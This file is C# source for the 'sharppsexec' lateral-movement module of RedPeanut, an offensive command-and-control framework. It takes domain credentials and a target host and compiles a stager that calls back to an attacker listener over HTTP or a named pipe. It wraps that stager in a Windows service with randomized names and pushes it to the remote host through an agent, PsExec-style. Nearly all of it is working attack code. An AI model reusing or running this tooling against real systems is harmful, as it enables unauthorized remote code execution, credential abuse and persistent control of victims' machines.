//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using static RedPeanut.Models;
using static RedPeanut.Utility;

namespace RedPeanut
{
    public class SharpPsExecManager : IMenu
    {
        public static Dictionary<string, string> mainmenu = new Dictionary<string, string>
        {
            { "set domain", "Set Domain" },
            { "set username", "Set username" },
            { "set password", "Set password" },
            { "set targethost", "Set Target host" },
            { "set lhost", "Set lhost" },
            { "set lport", "Set lport" },
            { "set lpipename", "Set lpipename" },
            { "set exename", "Set exename" },
            { "set profile", "Set profile" },
            { "set servdispname", "Set service display name" },
            { "set servdescr", "Set service description" },
            { "set servname", "Set service name" },
            { "run", "Execute module" },
            { "options", "Print help" },
            { "back", "Back to lateral menu" }
        };

        IAgentInstance agent = null;
        string modulename = "sharppsexec";
        string targethost = null;
        string username = null;
        string password = null;
        string domain = null;
        string lhost = null;
        int lport = 0;
        string lpipename = null;
        string exename = null;
        int profile = 0;
        string servdispname = null;
        string servdescr = null;
        string servname = null;

        bool exit = false;


        public SharpPsExecManager()
        {

        }

        public SharpPsExecManager(IAgentInstance agent)
        {
            this.agent = agent;
        }

        public void Execute()
        {
            exit = false;
            string input;
            SetAutoCompletionHandler(mainmenu);
            do
            {
                input = RedPeanutCLI(agent, modulename);
                PsExecMenu(input);
            } while (!exit);
        }

        private void PsExecMenu(string input)
        {
            string f_input = ParseSelection(input);

            if (!string.IsNullOrEmpty(input))
            {
                if (mainmenu.ContainsKey(f_input.TrimEnd()))
                {
                    switch (f_input.TrimEnd())
                    {
                        case "set targethost":
                            targethost = GetParsedSetString(input);
                            break;
                        case "set username":
                            username = GetParsedSetString(input);
                            break;
                        case "set password":
                            password = GetParsedSetString(input);
                            break;
                        case "set domain":
                            domain = GetParsedSetString(input);
                            break;
                        case "set lhost":
                            lhost = GetParsedSetString(input);
                            break;
                        case "set lport":
                            lport = GetParsedSetInt(input);
                            break;
                        case "set lpipename":
                            lpipename = GetParsedSetString(input);
                            break;
                        case "set exename":
                            exename = GetParsedSetString(input);
                            break;
                        case "set profile":
                            profile = GetParsedSetInt(input);
                            break;
                        case "set servdispname":
                            servdispname = GetParsedSetString(input);
                            break;
                        case "set servdescr":
                            servdescr = GetParsedSetString(input);
                            break;
                        case "set servname":
                            servname = GetParsedSetString(input);
                            break;
                        case "run":
                            Run();
                            break;
                        case "options":
                            PrintCurrentConfig();
                            break;
                        case "info":
                            PrintOptions("info", mainmenu);
                            break;
                        case "back":
                            Program.GetMenuStack().Pop();
                            exit = true;
                            return;
                        default:
                            Console.WriteLine("We had a woodoo");
                            break;
                    }
                }
                else
                {
                    PrintOptions("Command not found", mainmenu);
                }
            }
        }


        private void Run()
        {
            List<string> args = new List<string>();

            if (username == null || password == null || domain == null || targethost == null || lhost == null || profile == 0 || (lport == 0 && lpipename == null))
            {
                return;
            }
            else
            {
                //Create stager stream gzip
                string folderrpath = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, TEMPLATE_FOLDER);
                if (Program.GetC2Manager().GetC2Server().GetProfiles().ContainsKey(profile))
                {
                    string source = File.ReadAllText(Path.Combine(folderrpath, STAGER_TEMPLATE));

                    if (lpipename == null)
                    {
                        //Http no pivot stager
                        ListenerConfig conf = new ListenerConfig("", lhost, lport, Program.GetC2Manager().GetC2Server().GetProfile(profile), profile);
                        source = Replacer.ReplaceAgentProfile(source, RedPeanut.Program.GetServerKey(),40, conf);
                    }
                    else
                    {
                        //NamedPipe enable stager
                        ListenerPivotConfig conf = new ListenerPivotConfig("", lhost, lpipename, Program.GetC2Manager().GetC2Server().GetProfile(profile));
                        source = Replacer.ReplaceAgentProfile(source, RedPeanut.Program.GetServerKey(),40, conf);
                    }

                    string stagerstr = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, RandomAString(10, new Random()),40)));

                    //Create TaskMsg gzip
                    if (agent != null)
                    {
                        ModuleConfig modconfig = new ModuleConfig
                        {
                            Assembly = stagerstr,
                            Method = "Execute",
                            Moduleclass = "RedPeanutRP",
                            Parameters = new string[] { "pippo" }
                        };

                        TaskMsg task = new TaskMsg
                        {
                            TaskType = "module",
                            ModuleTask = modconfig,
                            Agentid = agent.AgentId
                        };

                        if (agent.Pivoter != null)
                            task.AgentPivot = agent.Pivoter.AgentId;

                        //Create Service stream gzip
                        source = File.ReadAllText(Path.Combine(folderrpath, SERVICE_TEMPLATE))
                        .Replace("#NUTCLR#", ReadResourceFile(PL_COMMAND_NUTCLR))
                        .Replace("#TASK#", Convert.ToBase64String(CompressGZipAssembly(Encoding.Default.GetBytes(JsonConvert.SerializeObject(task)))))
                        .Replace("#SPAWN#", Program.GetC2Manager().GetC2Server().GetProfile(profile).Spawn);

                        string servicestr = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, RandomAString(10, new Random()),40,"exe")));

                        //Create SharpPsExec stream gzip
                        source = File.ReadAllText(Path.Combine(folderrpath, SHARPSEXEC_TEMPLATE))
                        .Replace("#DOMAIN#", domain)
                        .Replace("#USERNAME#", username)
                        .Replace("#PASSWORD#", password)
                        .Replace("#HOSTANME#", targethost)
                        .Replace("#ASSEMBLY#", servicestr)
                        .Replace("#EXENAME#", (!string.IsNullOrEmpty(exename)) ? exename : RandomAString(10, new Random()) + ".exe")
                        .Replace("#SERVICEDISPLAYNAME#", (!string.IsNullOrEmpty(servdispname)) ? servdispname : RandomAString(10, new Random()))
                        .Replace("#SERVICEDESCRIPTION#", (!string.IsNullOrEmpty(servdescr)) ? servdescr : RandomAString(10, new Random()))
                        .Replace("#SERVICENAME#", (!string.IsNullOrEmpty(servname)) ? servname : RandomAString(10, new Random()));

                        string sharppsexecstr = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, RandomAString(10, new Random()) + ".dll",40)));
                        
                        RunAssemblyBase64(sharppsexecstr, "SharpPsExec.Program", new string[] { "pippo" }, agent);
                    }
                }
            }
        }

        private void PrintCurrentConfig()
        {
            Dictionary<string, string> properties = new Dictionary<string, string>
            {
                { "domain", domain },
                { "username", username },
                { "password", password },
                { "targethost", targethost },
                { "lhost", lhost },
                { "lport", lport.ToString() },
                { "lpipename", lpipename },
                { "exename", exename },
                { "profile", profile.ToString() },
                { "servdispname", servdispname },
                { "servdescr", servdescr },
                { "servname", servname }
            };

            Utility.PrintCurrentConfig(modulename, properties);
        }
    }
}
